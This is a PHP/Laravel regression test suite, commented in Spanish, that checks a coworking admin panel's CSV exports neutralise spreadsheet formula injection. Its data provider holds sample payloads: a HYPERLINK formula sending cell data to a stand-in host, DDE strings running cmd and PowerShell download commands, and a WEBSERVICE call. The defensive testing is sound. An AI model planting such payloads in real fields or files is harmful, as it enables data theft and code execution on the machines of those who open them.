<?php

namespace Tests\Feature\Panel;

use App\Models\DatosFiscales;
use App\Models\Espacio;
use App\Models\Factura;
use App\Models\Plane;
use App\Models\Reserva;
use App\Models\Suscripcion;
use App\Models\User;
use App\Support\CeldaCsv;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

/**
 * Regresión de la inyección de fórmulas en los CSV, encontrada en la revisión
 * de seguridad del 01/09/2026.
 *
 * El camino era: un miembro pone una fórmula en su nombre o en su razón social
 * —campos que él escribe y que solo se validan por longitud—, se deja caer en
 * un informe, y administración abre el CSV en Excel. La fórmula se evalúa en la
 * máquina de administración, con el RFC de todos los demás miembros en las
 * celdas de al lado.
 */
class ExportacionCsvTest extends TestCase
{
    use RefreshDatabase;

    /** Las cargas que una hoja de cálculo ejecutaría al abrir el archivo. */
    public static function formulas(): array
    {
        return [
            'HYPERLINK que exfiltra' => ['=HYPERLINK("https://atacante.mx/x?d="&A1&B1,"Ver factura")'],
            'DDE hacia el shell'     => ['=cmd|\'/C powershell -c iwr atacante.mx\'!A1'],
            'WEBSERVICE silencioso'  => ['=WEBSERVICE("https://atacante.mx/x")'],
            'con signo mas'          => ['+1+1'],
            'con signo menos'        => ['-2-3'],
            'con arroba'             => ['@SUM(1+1)*cmd|\' /C calc\'!A0'],
            'con tabulador'          => ["\t=1+1"],
            'con retorno de carro'   => ["\r=1+1"],
        ];
    }

    /** @dataProvider formulas */
    public function test_una_formula_se_neutraliza_antes_de_llegar_al_csv(string $carga): void
    {
        $neutralizada = CeldaCsv::segura($carga);

        $this->assertStringStartsWith("'", $neutralizada, "«{$carga}» sigue siendo ejecutable.");
        $this->assertSame("'" . $carga, $neutralizada, 'El valor debe conservarse íntegro, solo prefijado.');
    }

    public function test_un_texto_normal_no_se_toca(): void
    {
        foreach (['Ana Sofía Canul', 'Salabtún S.A. de C.V.', '9994615676', 'XAXX010101000', '', 'G03 — Gastos'] as $valor) {
            $this->assertSame($valor, CeldaCsv::segura($valor), "«{$valor}» no debía cambiar.");
        }
    }

    public function test_los_valores_que_no_son_texto_pasan_intactos(): void
    {
        $this->assertSame(1250.50, CeldaCsv::segura(1250.50));
        $this->assertSame(7, CeldaCsv::segura(7));
        $this->assertNull(CeldaCsv::segura(null));
        $this->assertTrue(CeldaCsv::segura(true));
    }

    // ── El camino completo, de punta a punta ────────────────────────────────

    /**
     * Lo que de verdad importa: que la fórmula que escribe un miembro llegue
     * neutralizada al archivo que descarga administración.
     */
    public function test_el_informe_de_riesgo_no_exporta_la_formula_del_miembro(): void
    {
        $carga = '=HYPERLINK("https://atacante.mx/x?d="&A1&B1,"Ver factura")';

        $plan = Plane::factory()->nodoPro()->create();
        $miembro = User::factory()->miembro()->create(['name' => $carga]);

        Suscripcion::factory()->delPlan($plan)->create([
            'user_id'   => $miembro->id,
            'fecha_fin' => today()->addMonths(3),
        ]);

        // Sin accesos, entra en «miembros en riesgo».
        $csv = $this->actingAs(User::factory()->admin()->create())
            ->get(route('reportes.exportar', ['informe' => 'en_riesgo']))
            ->assertOk()
            ->streamedContent();

        // `fputcsv` duplica las comillas internas al entrecomillar la celda,
        // asi que la carga no aparece literal en el archivo. Lo que se
        // comprueba es que la celda empieza por la comilla simple, que es lo
        // que impide que Excel la evalue.
        $this->assertStringContainsString(chr(34) . chr(39) . '=HYPERLINK', $csv, 'La formula debe ir prefijada.');
        $this->assertStringNotContainsString(',=HYPERLINK', $csv, 'Sin prefijo, Excel la ejecutaria.');
        $this->assertStringNotContainsString(chr(34) . '=HYPERLINK', $csv, 'Ni entrecomillada sin prefijo.');
    }

    public function test_la_exportacion_fiscal_no_exporta_la_razon_social_como_formula(): void
    {
        $carga = '=cmd|\'/C calc\'!A1';

        $plan = Plane::factory()->nodoPro()->create();
        $miembro = User::factory()->miembro()->create(['name' => 'Miembro normal']);

        Suscripcion::factory()->delPlan($plan)->create([
            'user_id'   => $miembro->id,
            'fecha_fin' => today()->addMonths(3),
        ]);

        DatosFiscales::create([
            'user_id'           => $miembro->id,
            'rfc'               => 'XAXX010101000',
            'razon_social'      => $carga,
            'regimen_fiscal'    => '612',
            'uso_cfdi'          => 'G03',
            'codigo_postal'     => '97110',
            'email_facturacion' => 'facturas@ejemplo.mx',
        ]);

        Factura::create([
            'user_id'  => $miembro->id,
            'folio'    => 'NOD-000001',
            'concepto' => 'Membresía Nodo Pro',
            'fecha'    => today()->toDateString(),
            'subtotal' => 516.38,
            'iva'      => 82.62,
            'total'    => 599,
            'estatus'  => 'Pagada',
        ]);

        $csv = $this->actingAs(User::factory()->admin()->create())
            ->get(route('facturas.exportar'))
            ->assertOk()
            ->streamedContent();

        $this->assertStringContainsString('XAXX010101000', $csv, 'El RFC sí debe salir: es el objeto de la exportación.');
        $this->assertStringContainsString("'" . $carga, $csv, 'La razón social debe ir prefijada.');
        $this->assertStringNotContainsString(',=cmd', $csv);
    }

    /** Los encabezados también pasan por el filtro, por si algún día son dinámicos. */
    public function test_el_csv_sigue_siendo_legible_para_un_humano(): void
    {
        $plan = Plane::factory()->nodoPro()->create();
        $user = User::factory()->miembro()->create(['name' => 'Ana Sofía Canul']);

        Suscripcion::factory()->delPlan($plan)->create([
            'user_id'   => $user->id,
            'fecha_fin' => today()->addMonths(3),
        ]);

        Espacio::factory()->salaJuntas()->create(['nombre' => 'Sala de Juntas']);

        $csv = $this->actingAs(User::factory()->admin()->create())
            ->get(route('reportes.exportar', ['informe' => 'ocupacion']))
            ->assertOk()
            ->streamedContent();

        $this->assertStringStartsWith("\xEF\xBB\xBF", $csv, 'Sin BOM, Excel destroza los acentos.');
        $this->assertStringContainsString('Sala de Juntas', $csv);
        $this->assertStringContainsString('espacio', $csv);
    }
}
